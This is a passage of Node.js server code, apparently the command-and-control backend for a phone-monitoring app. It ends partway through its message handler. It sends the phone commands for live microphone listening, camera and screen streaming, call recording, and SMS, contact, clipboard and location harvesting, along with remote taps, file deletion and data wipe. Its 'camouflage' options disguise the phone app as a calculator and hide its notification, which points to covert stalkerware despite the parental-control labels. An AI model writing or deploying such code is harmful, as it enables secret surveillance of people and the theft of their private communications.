import express from 'express';
import { WebSocketServer } from 'ws';
import { createServer } from 'http';
import cors from 'cors';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { mkdirSync, existsSync } from 'fs';
import { JSONFilePreset } from 'lowdb/node';
import { randomUUID } from 'crypto';
import os from 'os';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const dataDir = join(__dirname, '..', 'data');
mkdirSync(dataDir, { recursive: true });

const distPath = join(__dirname, '../../dashboard/dist');

const app = express();
app.use(cors());
app.use(express.json({ limit: '25mb' }));

if (existsSync(distPath)) {
  app.use(express.static(distPath));
}

const httpServer = createServer(app);
const wss = new WebSocketServer({ server: httpServer });

const defaultData = {
  devices: [], calls: [], messages: [], locations: [], notifications: [], contacts: [],
  // Round 3 feature data — all keyed/tagged by deviceId.
  deviceInfo: {}, installedApps: {}, wifi: {},
  clipboardHistory: [], callBlocklist: {}, commandQueue: []
};
const db = await JSONFilePreset(join(dataDir, 'db.json'), defaultData);
await db.read();

// defaultData only applies when db.json doesn't exist yet — an existing file
// from before a field was added keeps its old shape forever otherwise, and
// every route touching the missing key throws. Backfill anything missing.
const ARRAY_KEYS = ['devices', 'calls', 'messages', 'locations', 'notifications', 'contacts', 'clipboardHistory', 'commandQueue'];
const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd', 'syncConfig'];
for (const key of ARRAY_KEYS) {
  if (!Array.isArray(db.data[key])) db.data[key] = [];
}
for (const key of OBJECT_KEYS) {
  if (!db.data[key] || typeof db.data[key] !== 'object') db.data[key] = {};
}
// BUG 1 migration: registration is idempotent by deviceId (devices.set +
// persistDevice filters by id), but old db.json files may hold stale rows.
// Collapse exact duplicate ids on startup so the sidebar can't show the same
// deviceId twice going forward. Rows with *different* ids (from the old
// regenerating-id bug) are left alone — delete them via DELETE /api/devices/:id.
{
  const seen = new Set();
  const deduped = [];
  for (const d of db.data.devices) {
    if (d && d.id && seen.has(d.id)) continue;
    if (d && d.id) seen.add(d.id);
    deduped.push(d);
  }
  if (deduped.length !== db.data.devices.length) {
    db.data.devices = deduped;
  }
}
await db.write();

const clients = new Map();
const devices = new Map();

/** Mirrored notifications are a live feed, so the log is capped rather than unbounded. */
const MAX_NOTIFICATION_LOG = 300;

function getLocalIP() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return 'localhost';
}

function broadcastToDashboard(event, payload) {
  const message = JSON.stringify({ event, payload });
  for (const ws of clients.values()) {
    if (ws.readyState === 1) ws.send(message);
  }
}

/**
 * REST command name -> phone-side event name. Used by the live dispatch AND the
 * offline queue replay, so both paths always send the same canonical event.
 */
const COMMAND_EVENTS = {
  'send-sms': 'SEND_SMS_COMMAND',
  'file-list': 'FILE_LIST_REQUEST',
  'file-download': 'FILE_DOWNLOAD_REQUEST',
  'file-upload': 'FILE_UPLOAD_CHUNK',
  'request-location': 'LOCATION_REQUEST',
  'request-calls': 'CALLS_REQUEST',
  'request-sms': 'SMS_REQUEST',
  'request-contacts': 'CONTACTS_REQUEST',
  'add-contact': 'ADD_CONTACT_COMMAND',
  'find-phone': 'FIND_PHONE_COMMAND',
  'find-phone-stop': 'FIND_PHONE_STOP_COMMAND',
  'notification-dismiss': 'NOTIFICATION_DISMISS_COMMAND',
  'notification-clear-all': 'NOTIFICATION_CLEAR_ALL_COMMAND',
  'vibrate': 'VIBRATE_COMMAND',
  'tts': 'TTS_COMMAND',
  'play-audio': 'PLAY_AUDIO_COMMAND',
  'play-audio-stop': 'PLAY_AUDIO_STOP',
  'wallpaper': 'WALLPAPER_COMMAND',
  'device-info': 'DEVICE_INFO_REQUEST',
  'installed-apps': 'INSTALLED_APPS_REQUEST',
  'app-perms': 'APP_PERMS_REQUEST',
  'wifi-info': 'WIFI_REQUEST',
  'clipboard-read': 'CLIPBOARD_READ_REQUEST',
  'clipboard-enable': 'CLIPBOARD_CAPTURE_ENABLE',
  'clipboard-disable': 'CLIPBOARD_CAPTURE_DISABLE',
  'lock': 'LOCK_COMMAND',
  'call-blocklist-sync': 'CALL_BLOCKLIST_SYNC',
  'mic-record': 'MIC_RECORD_COMMAND',
  'camera-capture': 'CAMERA_CAPTURE_COMMAND',
  'screenshot': 'SCREENSHOT_COMMAND',
  'screen-record-start': 'SCREEN_RECORD_START',
  'screen-record-stop': 'SCREEN_RECORD_STOP',
  'camera-stream-start': 'CAMERA_STREAM_START',
  'camera-stream-stop': 'CAMERA_STREAM_STOP',
  'request-notifications': 'NOTIFICATIONS_REQUEST',
  'notification-sync-set': 'NOTIFICATION_SYNC_SET',
  'torch': 'TORCH_COMMAND',
  'wipe-data': 'WIPE_COMMAND',
  'live-listen-start': 'LIVE_LISTEN_START',
  'live-listen-stop': 'LIVE_LISTEN_STOP',
  'input-key': 'INPUT_KEY_COMMAND',
  'input-tap': 'INPUT_TAP_COMMAND',
  'input-swipe': 'INPUT_SWIPE_COMMAND',
  'volume-get': 'VOLUME_GET_REQUEST',
  'volume-set': 'VOLUME_SET_COMMAND',
  'clipboard-write': 'CLIPBOARD_WRITE_COMMAND',
  'open-url': 'OPEN_URL_COMMAND',
  'battery-stats': 'BATTERY_STATS_REQUEST',
  'launch-app': 'LAUNCH_APP_COMMAND',
  'lost-mode': 'LOST_MODE_COMMAND',
  'media-gallery': 'MEDIA_GALLERY_REQUEST',
  'input-text': 'INPUT_TEXT_COMMAND',
  'screen-wake': 'SCREEN_WAKE_COMMAND',
  'call-action': 'CALL_ACTION_COMMAND',
  'cellular-info': 'CELLULAR_INFO_REQUEST',
  'torch-strobe': 'TORCH_STROBE_COMMAND',
  'junk-scan': 'JUNK_SCAN_REQUEST',
  'junk-clean': 'JUNK_CLEAN_COMMAND',
  'dnd-get': 'DND_GET_REQUEST',
  'dnd-set': 'DND_SET_COMMAND',
  'file-delete': 'FILE_DELETE_COMMAND',
  'file-rename': 'FILE_RENAME_COMMAND',
  'file-mkdir': 'FILE_MKDIR_COMMAND',
  'file-move': 'FILE_MOVE_COMMAND',
  'file-copy': 'FILE_COPY_COMMAND',
  'uninstall-app': 'UNINSTALL_APP_COMMAND',
  'timeline-config': 'TIMELINE_CONFIG_COMMAND',
  'call-outgoing': 'CALL_OUTGOING_COMMAND',
  'motion-alarm-config': 'MOTION_ALARM_CONFIG_COMMAND',
  'walkie-talkie-start': 'WALKIE_TALKIE_START',
  'walkie-talkie-chunk': 'WALKIE_TALKIE_CHUNK',
  'walkie-talkie-stop': 'WALKIE_TALKIE_STOP',
  'sync-config': 'SYNC_CONFIG_COMMAND',
  'parental-control': 'PARENTAL_CONTROL_CONFIG_COMMAND',
  'app-usage': 'APP_USAGE_REQUEST',
  'battery-config': 'BATTERY_CONFIG_COMMAND',
  'auto-timelapse-config': 'AUTO_TIMELAPSE_CONFIG_COMMAND',
  'geofence-config': 'GEOFENCE_CONFIG_COMMAND',
  'auto-reply-config': 'AUTO_REPLY_CONFIG_COMMAND',
  'network-usage': 'NETWORK_USAGE_REQUEST',
  'schedule-command': 'SCHEDULE_COMMAND',
  'sos-config': 'SOS_CONFIG_COMMAND',
  'call-recording-config': 'CALL_RECORDING_CONFIG_COMMAND',
  'camouflage-config': 'CAMOUFLAGE_CONFIG_COMMAND',
  'quick-setting': 'QUICK_SETTING_COMMAND'
};

/** Builds the phone payload for a REST command (1:1 mapping for most). */
function commandPayload(name, body = {}) {
  switch (name) {
    case 'send-sms': return { recipient: body.recipient, message: body.message };
    case 'file-list': return { path: body.path || '/' };
    case 'file-download': return { path: body.path, name: body.name, mimeType: body.mimeType };
    case 'file-upload': return { path: body.path, data: body.data, isLastChunk: body.isLastChunk };
    case 'add-contact': return { name: body.name, number: body.number };
    case 'notification-dismiss': return { key: body.key };
    case 'notification-sync-set': return { enabled: body.enabled !== false };
    case 'vibrate': return { durationMs: Number(body.durationMs) || 500, pattern: Array.isArray(body.pattern) ? body.pattern : null };
    case 'app-perms': return { packageName: body.packageName };
    case 'clipboard-enable':
    case 'clipboard-disable': return { enabled: name === 'clipboard-enable' };
    case 'tts': return { text: body.text, speed: body.speed ?? 1.0, pitch: body.pitch ?? 1.0 };
    case 'play-audio': return { url: body.url || null, data: body.data || null, loop: !!body.loop };
    case 'wallpaper': return { url: body.url || null, color: body.color || null, data: body.data || null };
    case 'mic-record': return { durationSec: Math.max(5, Math.min(60, Number(body.durationSec) || 15)) };
    case 'camera-capture': return { facing: body.facing === 'front' ? 'front' : 'back' };
    case 'camera-stream-start': return { facing: body.facing === 'front' ? 'front' : 'back', quality: body.quality || 'low', fps: Math.max(1, Math.min(30, Number(body.fps) || 15)) };
    case 'screen-record-start': return { fps: Math.max(1, Math.min(30, Number(body.fps) || 15)) };
    case 'call-blocklist-sync': return { enabled: !!body.enabled, numbers: Array.isArray(body.numbers) ? body.numbers : [] };
    case 'torch': return { enabled: !!body.enabled };
    case 'wipe-data': return { confirmation: body.confirmation };
    case 'live-listen-start': return {};
    case 'live-listen-stop': return {};
    case 'input-key': return { action: body.action };
    case 'input-tap': return {
      x: Number(body.x) || 0,
      y: Number(body.y) || 0,
      xRatio: body.xRatio !== undefined && body.xRatio !== null ? Number(body.xRatio) : null,
      yRatio: body.yRatio !== undefined && body.yRatio !== null ? Number(body.yRatio) : null,
      duration: Number(body.duration) || 50
    };
    case 'input-swipe': return {
      x1: Number(body.x1) || 0,
      y1: Number(body.y1) || 0,
      x2: Number(body.x2) || 0,
      y2: Number(body.y2) || 0,
      x1Ratio: body.x1Ratio !== undefined && body.x1Ratio !== null ? Number(body.x1Ratio) : null,
      y1Ratio: body.y1Ratio !== undefined && body.y1Ratio !== null ? Number(body.y1Ratio) : null,
      x2Ratio: body.x2Ratio !== undefined && body.x2Ratio !== null ? Number(body.x2Ratio) : null,
      y2Ratio: body.y2Ratio !== undefined && body.y2Ratio !== null ? Number(body.y2Ratio) : null,
      duration: Number(body.duration) || 300
    };
    case 'find-phone-stop': return {};
    case 'volume-get': return {};
    case 'volume-set': return { stream: body.stream, level: body.level, ringerMode: body.ringerMode };
    case 'clipboard-write': return { text: body.text || '' };
    case 'open-url': return { url: body.url || '' };
    case 'battery-stats': return {};
    case 'launch-app': return { packageName: body.packageName || '' };
    case 'lost-mode': return { enable: body.enable !== false, message: body.message, phone: body.phone, soundAlarm: !!body.soundAlarm };
    case 'media-gallery': return { limit: Number(body.limit) || 36 };
    case 'input-text': return { text: body.text || '' };
    case 'screen-wake': return {};
    case 'call-action': return { action: body.action || 'answer', speaker: body.speaker !== false };
    case 'cellular-info': return {};
    case 'torch-strobe': return { enabled: !!body.enabled, speedMs: Number(body.speedMs) || 150, durationSec: Number(body.durationSec) || 30 };
    case 'junk-scan': return {};
    case 'junk-clean': return { categoryId: body.categoryId || '', paths: Array.isArray(body.paths) ? body.paths : null };
    case 'dnd-get': return {};
    case 'dnd-set': return { mode: body.mode || 'OFF' };
    case 'file-delete': return { path: body.path || '' };
    case 'file-rename': return { path: body.path || '', newName: body.newName || '' };
    case 'file-mkdir': return { parentPath: body.parentPath || '/', folderName: body.folderName || '' };
    case 'file-move': return { sourcePath: body.sourcePath || '', destParentPath: body.destParentPath || '/' };
    case 'file-copy': return { sourcePath: body.sourcePath || '', destParentPath: body.destParentPath || '/' };
    case 'uninstall-app': return { packageName: body.packageName || '' };
    case 'timeline-config': return { enabled: !!body.enabled, minRadiusMeters: Number(body.minRadiusMeters) || 200, dwellMinutes: Number(body.dwellMinutes) || 5 };
    case 'call-outgoing': return { number: String(body.number || '') };
    case 'motion-alarm-config': return { arm: !!body.arm, threshold: Number(body.threshold) || 2.5, delaySec: Number(body.delaySec) || 3 };
    case 'walkie-talkie-start': return {};
    case 'walkie-talkie-chunk': return { data: body.data || '' };
    case 'walkie-talkie-stop': return {};
    case 'sync-config': return {
      notifications: body.notifications,
      calls: body.calls,
      sms: body.sms,
      location: body.location,
      clipboard: body.clipboard,
      recordings: body.recordings,
      telemetry: body.telemetry,
      lowDataMode: body.lowDataMode
    };
    case 'parental-control': return {
      enabled: body.enabled,
      blockedPackages: body.blockedPackages,
      screenTimeLimitMinutes: body.screenTimeLimitMinutes,
      allowedPackages: body.allowedPackages
    };
    case 'app-usage': return {};
    case 'battery-config': return {
      batteryAlertsEnabled: body.batteryAlertsEnabled,
      batteryMaxLevelCutoff: Number(body.batteryMaxLevelCutoff) || 90,
      batteryOverheatTempThreshold: Number(body.batteryOverheatTempThreshold) || 45.0
    };
    case 'auto-timelapse-config': return {
      enabled: !!body.enabled,
      intervalMins: Number(body.intervalMins) || 5,
      facing: body.facing === 'front' ? 'front' : 'back'
    };
    case 'geofence-config': return {
      enabled: !!body.enabled,
      latitude: Number(body.latitude) || 0,
      longitude: Number(body.longitude) || 0,
      radiusMeters: Number(body.radiusMeters) || 300,
      name: body.name || 'Safe Zone'
    };
    case 'auto-reply-config': return {
      enabled: !!body.enabled,
      message: body.message || '',
      packages: Array.isArray(body.packages) ? body.packages : ['com.whatsapp']
    };
    case 'network-usage': return {};
    case 'schedule-command': return {
      action: body.action || 'list',
      id: body.id,
      triggerTimeMs: Number(body.triggerTimeMs) || 0,
      commandEvent: body.commandEvent,
      payload: body.payload || {}
    };
    case 'sos-config': return {
      enabled: body.enabled !== false
    };
    case 'call-recording-config': return {
      enabled: !!body.enabled
    };
    case 'camouflage-config': return {
      calculatorDisguise: body.calculatorDisguise,
      stealthNotification: body.stealthNotification,
      antiTamper: body.antiTamper,
      ownerPin: body.ownerPin
    };
    case 'quick-setting': return {
      action: body.action || '',
      enable: body.enable,
      mode: body.mode,
      payload: body.payload || {}
    };
    default: return {};
  }
}

/**
 * Replay every queued command for [deviceId] on socket reconnect, then clear
 * the queue. Commands that ran while the phone was offline arrive again after
 * DEVICE_REGISTER -> no data loss for round-3 controls.
 */
function replayQueue(deviceId) {
  const q = db.data.commandQueue || [];
  const kept = [];
  for (const item of q) {
    if (item.deviceId === deviceId) {
      const event = COMMAND_EVENTS[item.command] || item.command;
      const payload = item.payload ? (item.payload.raw ? item.payload : commandPayload(item.command, item.payload)) : {};
      sendToDevice(deviceId, event, payload);
    } else {
      kept.push(item);
    }
  }
  if (kept.length !== q.length) {
    db.data.commandQueue = kept;
    db.write();
  }
}

/**
 * Accepts the alternate event names from ARCHITECTURE.md alongside the
 * canonical ones, so both naming conventions work against one server.
 */
const EVENT_ALIASES = {
  DEVICE_STATUS_UPDATE: 'DEVICE_STATUS',
  LOCATION_REPORT: 'LOCATION_UPDATE',
  CMD_SEND_SMS: 'SEND_SMS_COMMAND',
  CMD_FETCH_LOCATION: 'LOCATION_REQUEST',
  CMD_BROWSE_STORAGE: 'FILE_LIST_REQUEST',
  NOTIFICATION_EVENT: 'NOTIFICATION_POSTED'
};

/**
 * Rewrites a phone's message into the canonical shape used by the dashboard.
 * Handles the ARCHITECTURE.md payload spellings (name, lat/lng, INBOX types).
 */
function normalizeMessage(msg) {
  const event = EVENT_ALIASES[msg.event] ?? msg.event;
  const payload = { ...(msg.payload || {}) };

  if (event === 'DEVICE_REGISTER' || event === 'DEVICE_STATUS') {
    payload.deviceName = payload.deviceName ?? payload.name ?? 'Android phone';
  }

  if (event === 'SYNC_CALLS' && Array.isArray(payload.calls)) {
    payload.calls = payload.calls.map((call) => ({
      ...call,
      type: String(call.type ?? 'incoming').toLowerCase()
    }));
  }

  if (event === 'SYNC_SMS' && Array.isArray(payload.messages)) {
    payload.messages = payload.messages.map((message) => {
      const raw = message.type;
      const type = typeof raw === 'number' ? raw : String(raw).toUpperCase() === 'SENT' ? 2 : 1;
      return { ...message, type };
    });
  }

  if (event === 'LOCATION_UPDATE') {
    payload.latitude = payload.latitude ?? payload.lat;
    payload.longitude = payload.longitude ?? payload.lng;
    payload.timestamp = payload.timestamp ?? payload.updatedAt ?? Date.now();
  }

  return { event, payload };
}

function sendToDevice(deviceId, event, payload) {
  const device = devices.get(deviceId);
  if (device && device.wsClientId) {
    const ws = clients.get(device.wsClientId);
    if (ws && ws.readyState === 1) ws.send(JSON.stringify({ event, payload }));
  }
}

function persistDevice(device) {
  db.data.devices = db.data.devices.filter((d) => d.id !== device.id);
  db.data.devices.push(device);
  db.write();
}

wss.on('connection', (ws) => {
  const clientId = randomUUID();
  ws.clientId = clientId;
  clients.set(clientId, ws);
  console.log(`[ws] client connected: ${clientId} (total ${clients.size})`);

  ws.on('message', (raw) => {
    let rawMsg;
    try {
      rawMsg = JSON.parse(raw.toString());
    } catch (e) {
      console.error('[ws] invalid JSON payload');
      return;
    }
    const msg = normalizeMessage(rawMsg);
    try {
      handleMessage(ws, msg);
    } catch (e) {
      console.error('[ws] handler error:', e);
    }
  });

  ws.on('close', () => {
    clients.delete(clientId);
    for (const [deviceId, device] of devices) {
      if (device.wsClientId === clientId) {
        device.wsClientId = null;
        device.online = false;
        persistDevice(device);
        broadcastToDashboard('DEVICE_UPDATE', { ...device, deviceId });
      }
    }
    console.log(`[ws] client disconnected: ${clientId} (total ${clients.size})`);
  });
});

function handleMessage(ws, msg) {
  const payload = msg.payload || {};

  switch (msg.event) {
    case 'DEVICE_REGISTER': {
      const { deviceId, deviceName, battery, isCharging, wifiName } = payload;
      if (!deviceId) return;
      const device = {
        id: deviceId,
        deviceId,
        deviceName: deviceName || 'Android phone',
        battery: Number.isFinite(battery) ? battery : 100,
        isCharging: !!isCharging,
        temperatureC: payload.temperatureC ?? null,
        voltageMv: payload.voltageMv ?? null,
        health: payload.health ?? null,
        plugged: payload.plugged ?? null,
        wifiName: wifiName || null,
        notificationSyncEnabled: payload.notificationSyncEnabled !== false,
        lastSeen: Date.now(),
        last_seen: Date.now(),
        online: true,
        wsClientId: ws.clientId
      };
      devices.set(deviceId, device);
      persistDevice(device);
      ws.send(JSON.stringify({ event: 'DEVICE_REGISTERED', payload: { deviceId } }));
      broadcastToDashboard('DEVICE_UPDATE', device);

      // Re-apply stored syncConfig preferences to the phone if set, or record phone defaults
      if (db.data.syncConfig?.[deviceId]) {
        sendToDevice(deviceId, 'SYNC_CONFIG_COMMAND', db.data.syncConfig[deviceId]);
      } else if (payload.syncConfig) {
        if (!db.data.syncConfig) db.data.syncConfig = {};
        db.data.syncConfig[deviceId] = payload.syncConfig;
        db.write();
      }
      if (db.data.syncConfig?.[deviceId]) {
        broadcastToDashboard('SYNC_CONFIG_STATUS', { deviceId, ...db.data.syncConfig[deviceId] });
      }

      replayQueue(deviceId);
      console.log(`[device] registered ${deviceId} (${device.deviceName}) @${battery}%`);
      break;
    }

    case 'DEVICE_STATUS': {
      const { deviceId, battery, isCharging, wifiName } = payload;
      const device = devices.get(deviceId);
      if (!device) return;
      device.battery = Number.isFinite(battery) ? battery : device.battery;
      device.isCharging = !!isCharging;
      if (payload.temperatureC != null) device.temperatureC = payload.temperatureC;
      if (payload.voltageMv != null) device.voltageMv = payload.voltageMv;
      if (payload.health) device.health = payload.health;
      if (payload.plugged) device.plugged = payload.plugged;
      if (wifiName) device.wifiName = wifiName;
      if (payload.notificationSyncEnabled !== undefined) device.notificationSyncEnabled = !!payload.notificationSyncEnabled;
      device.lastSeen = Date.now();
      device.last_seen = device.lastSeen;
      persistDevice(device);
      broadcastToDashboard('DEVICE_UPDATE', device);
      break;
    }

    case 'SYNC_CALLS': {
      const { deviceId, calls = [] } = payload;
      for (const call of calls) {
        db.data.calls = db.data.calls.filter((c) => c.id !== call.id);
        db.data.calls.push({ ...call, deviceId });
      }
      db.data.calls.sort((a, b) => b.timestamp - a.timestamp);
      db.write();
      broadcastToDashboard('CALLS_SYNCED', { deviceId, calls });
      console.log(`[sync] calls from ${deviceId}: ${calls.length}`);
      break;
    }

    case 'SYNC_SMS': {
      const { deviceId, messages = [] } = payload;
      for (const message of messages) {
        db.data.messages = db.data.messages.filter((m) => m.id !== message.id);
        db.data.messages.push({ ...message, deviceId });
      }
      db.write();
      broadcastToDashboard('SMS_SYNCED', { deviceId, messages });
      console.log(`[sync] sms from ${deviceId}: ${messages.length}`);
      break;
    }

    case 'LOCATION_UPDATE': {
      const { deviceId, latitude, longitude, accuracy, speed, altitude, bearing, timestamp, isTimelinePoint, error } = payload;
      if (latitude != null && longitude != null) {
        if (isTimelinePoint === true) {
          db.data.locations.push({
            id: randomUUID(),
            deviceId,
            latitude,
            longitude,
            accuracy,
            speed: speed ?? null,
            altitude: altitude ?? null,
            bearing: bearing ?? null,
            timestamp: timestamp || Date.now(),
            isTimelinePoint: true
          });
          if (db.data.locations.length > 5000) db.data.locations = db.data.locations.slice(-5000);
          db.write();
        }
      }
      broadcastToDashboard('LOCATION_UPDATE', {
        deviceId,
        latitude,
        longitude,
        accuracy,
        speed,
        altitude,
        bearing,
        timestamp: timestamp || Date.now(),
        isTimelinePoint,
        error
      });
      break;
    }

    case 'FILE_LIST_RESPONSE':
      broadcastToDashboard('FILE_LIST_RESPONSE', payload);
      break;

    case 'FILE_DOWNLOAD_RESPONSE':
      broadcastToDashboard('FILE_DOWNLOAD_RESPONSE', payload);
      break;

    case 'FILE_UPLOAD_STATUS':
      broadcastToDashboard('FILE_UPLOAD_STATUS', payload);
      break;

    case 'SEND_SMS_RESULT':
      broadcastToDashboard('SEND_SMS_RESULT', payload);
      break;

    case 'NOTIFICATION_POSTED': {
      const entry = {
        key: payload.key || `${payload.deviceId}-${Date.now()}`,
        deviceId: payload.deviceId,
        packageName: payload.packageName ?? '',
        appName: payload.appName ?? payload.packageName ?? 'Unknown app',
        title: payload.title ?? '',
        text: payload.text ?? '',
        postTime: payload.postTime || payload.timestamp || Date.now(),
        ongoing: !!payload.ongoing,
        cleared: false
      };
      // Keep the log bounded so a chatty app cannot grow it forever.
      db.data.notifications = db.data.notifications.filter((n) => n.key !== entry.key);
      db.data.notifications.push(entry);
      if (db.data.notifications.length > MAX_NOTIFICATION_LOG) {
        db.data.notifications = db.data.notifications.slice(-MAX_NOTIFICATION_LOG);
      }
      db.write();
      broadcastToDashboard('NOTIFICATION_POSTED', entry);
      break;
    }

    case 'NOTIFICATION_REMOVED': {
      const key = payload.key;
      if (!key) return;
      db.data.notifications = db.data.notifications.filter((n) => n.key !== key);
      db.write();
      broadcastToDashboard('NOTIFICATION_REMOVED', { key, deviceId: payload.deviceId });
      break;
    }

    // FEATURE A: contacts sync, same pattern as SYNC_CALLS/SYNC_SMS.
    case 'SYNC_CONTACTS': {
      const { deviceId, contacts = [] } = payload;
      if (!deviceId) return;
      // Replace the device's contact list wholesale (phone sends full list).
      db.data.contacts = db.data.contacts.filter((c) => c.deviceId !== deviceId);
      for (const contact of contacts) {
        db.data.contacts.push({ ...contact, deviceId });
      }
      db.write();
      broadcastToDashboard('CONTACTS_SYNCED', { deviceId, contacts });
      console.log(`[sync] contacts from ${deviceId}: ${contacts.length}`);
      break;
    }

    case 'ADD_CONTACT_RESULT':
      broadcastToDashboard('ADD_CONTACT_RESULT', payload);
      break;

    case 'FIND_PHONE_STOPPED':
      broadcastToDashboard('FIND_PHONE_STOPPED', payload);
      break;

    // The user dismissed it on the phone side; tell the dashboard to drop it too.
    case 'NOTIFICATION_DISMISS_RESULT': {
      broadcastToDashboard('NOTIFICATION_REMOVED', { key: payload.key, deviceId: payload.deviceId });
      break;
    }

    case 'NOTIFICATION_SYNC_STATUS': {
      const { deviceId, enabled } = payload;
      const device = devices.get(deviceId);
      if (device) {
        device.notificationSyncEnabled = !!enabled;
        persistDevice(device);
        broadcastToDashboard('DEVICE_UPDATE', device);
      }
      broadcastToDashboard('NOTIFICATION_SYNC_STATUS', payload);
      break;
    }

    // ARCHITECTURE.md's explicit ring alert. Kept distinct from SYNC_CALLS so a
    // regular incoming-call sync can never be mistaken for a live ring.
    case 'INCOMING_CALL_RING':
      broadcastToDashboard('INCOMING_CALL_RING', {
        deviceId: payload.deviceId,
        number: payload.number ?? '',
        name: payload.name ?? null,
        timestamp: payload.timestamp ?? Date.now()
      });
      console.log(`[ring] ${payload.deviceId} <- ${payload.number || 'unknown'}`);
      break;

    // Round 3 remote control & telemetry responses
    case 'DEVICE_INFO_RESPONSE': {
      const { deviceId } = payload;
      if (deviceId) {
        db.data.deviceInfo[deviceId] = payload;
        db.write();
      }
      broadcastToDashboard('DEVICE_INFO_RESPONSE', payload);
      break;
    }

    case 'INSTALLED_APPS_RESPONSE': {
      const { deviceId, apps = [] } = payload;
      if (deviceId) {
        db.data.installedApps[deviceId] = apps;
        db.write();
      }
      broadcastToDashboard('INSTALLED_APPS_RESPONSE', payload);
      break;
    }

    case 'APP_PERMS_RESPONSE':
      broadcastToDashboard('APP_PERMS_RESPONSE', payload);
      break;

    case 'WIFI_RESPONSE': {
      const { deviceId } = payload;
      if (deviceId) {
        db.data.wifi[deviceId] = payload;
        db.write();
      }
      broadcastToDashboard('WIFI_RESPONSE', payload);
      break;
    }

    case 'CLIPBOARD_READ_RESPONSE':
      broadcastToDashboard('CLIPBOARD_READ_RESPONSE', payload);
      break;

    case 'CLIPBOARD_UPDATE': {
      const { deviceId, text } = payload;
      if (deviceId && text) {
        db.data.clipboardHistory.unshift({ id: randomUUID(), deviceId, text, timestamp: payload.timestamp || Date.now() });
        if (db.data.clipboardHistory.length > 100) db.data.clipboardHistory = db.data.clipboardHistory.slice(0, 100);
        db.write();
      }
      broadcastToDashboard('CLIPBOARD_UPDATE', payload);
      break;
    }

    case 'VIBRATE_RESULT':
    case 'TTS_RESULT':
    case 'PLAY_AUDIO_RESULT':
    case 'WALLPAPER_RESULT':
    case 'LOCK_RESULT':
    case 'MIC_RECORD_RESULT':
    case 'CAMERA_CAPTURE_RESULT':
    case 'CAMERA_STREAM_FRAME':
    case 'SCREENSHOT_RESULT':
    case 'SCREEN_RECORD_FRAME':
    case 'TORCH_RESULT':
    case 'WIPE_RESULT':
    case 'LIVE_LISTEN_STATUS':
    case 'LIVE_AUDIO_CHUNK':
    case 'INPUT_KEY_RESULT':
    case 'INPUT_GESTURE_RESULT':
    case 'INPUT_TEXT_RESULT':
    case 'SCREEN_WAKE_RESULT':
    case 'CALL_ACTION_RESULT':
    case 'TORCH_STROBE_RESULT':
    case 'JUNK_SCAN_RESPONSE':
    case 'JUNK_CLEAN_RESULT':
    case 'VOLUME_INFO_RESPONSE':
    case 'VOLUME_SET_RESULT':
    case 'CLIPBOARD_WRITE_RESULT':
    case 'OPEN_URL_RESULT':
    case 'BATTERY_STATS_RESPONSE':
    case 'LAUNCH_APP_RESULT':
    case 'LOST_MODE_RESULT':
    case 'LOST_MODE_STATUS':
    case 'MEDIA_GALLERY_RESPONSE':
    case 'FILE_DELETE_RESULT':
    case 'FILE_RENAME_RESULT':
    case 'FILE_MKDIR_RESULT':
    case 'FILE_MOVE_RESULT':
    case 'FILE_COPY_RESULT':
    case 'UNINSTALL_APP_RESULT':
    case 'TIMELINE_CONFIG_RESULT':
    case 'CALL_OUTGOING_RESULT':
    case 'MOTION_ALARM_CONFIG_RESULT':
    case 'MOTION_ALARM_TRIGGERED':
    case 'MOTION_ALARM_STATUS':
    case 'WALKIE_TALKIE_STATUS':
    case 'INTRUDER_ALERT':
    case 'PARENTAL_CONTROL_STATUS':
    case 'APP_USAGE_RESPONSE':
    case 'BATTERY_ALERT_EVENT':
    case 'BATTERY_CONFIG_STATUS':
    case 'AUTO_TIMELAPSE_CONFIG_STATUS':
    case 'AUTO_TIMELAPSE_FRAME':
    case 'GEOFENCE_CONFIG_STATUS':
    case 'GEOFENCE_ALERT':
    case 'AUTO_REPLY_CONFIG_STATUS':
    case 'AUTO_REPLY_SENT':
    case 'NETWORK_USAGE_RESPONSE':
    case 'SCHEDULE_RESULT':
    case 'SCHEDULE_LIST_RESPONSE':
    case 'SOS_TRIGGERED':
    case 'SOS_CONFIG_STATUS':
    case 'CALL_RECORDING_STATUS':
    case 'CALL_RECORDING_SAVED':
    case 'CAMOUFLAGE_STATUS':
    case 'QUICK_SETTING_STATUS':
      broadcastToDashboard(msg.event, payload);
      break;

    case 'SYNC_CONFIG_STATUS': {
      const { deviceId } = payload;
      if (deviceId) {
        if (!db.data.syncConfig) db.data.syncConfig = {};
        db.data.syncConfig[deviceId] = payload;
        db.write();
      }
      broadcastToDashboard('SYNC_CONFIG_STATUS', payload);
      break;
    }

    case 'LOCATION_BATCH_UPDATE': {
      const fixes = Array.isArray(payload.waypoints) ? payload.waypoints : (Array.isArray(payload.fixes) ? payload.fixes : (Array.isArray(payload) ? payload : []));
      for (const fix of fixes) {
        if (fix && fix.latitude != null && fix.longitude != null) {
          db.data.locations.push({
            id: randomUUID(),
            deviceId: payload.deviceId || fix.deviceId,
            latitude: fix.latitude,
            longitude: fix.longitude,
            accuracy: fix.accuracy ?? null,
            speed: fix.speed ?? null,
            altitude: fix.altitude ?? null,
            bearing: fix.bearing ?? null,
            timestamp: fix.timestamp || Date.now(),
            isTimelinePoint: true
          });
        }
      }
      if (fixes.length > 0) {
        if (db.data.locations.length > 5000) db.data.locations = db.data.locations.slice(-5000);
        db.write();
        broadcastToDashboard('LOCATION_BATCH_UPDATE', {
          deviceId: payload.deviceId,
          count: fixes.length,
          waypoints: fixes
        });
      }
      break;
    }

    case 'CELLULAR_INFO_RESPONSE': {
      const { deviceId } = payload;
      if (deviceId) {
        if (!db.data.cellular) db.data.cellular = {};
        db.data.cellular[deviceId] = payload;
        db.write();
      }
      broadcastToDashboard('CELLULAR_INFO_RESPONSE', payload);
      break;
    }

    case 'DND_STATUS_RESPONSE':
    case 'DND_SET_RESULT': {
      const { deviceId } = payload;
      if (deviceId) {
        if (!db.data.dnd) db.data.dnd = {};
        db.data.dnd[deviceId] = payload;
        db.write();
      }
      broadcastToDashboard(msg.event, payload);
      break;
    }

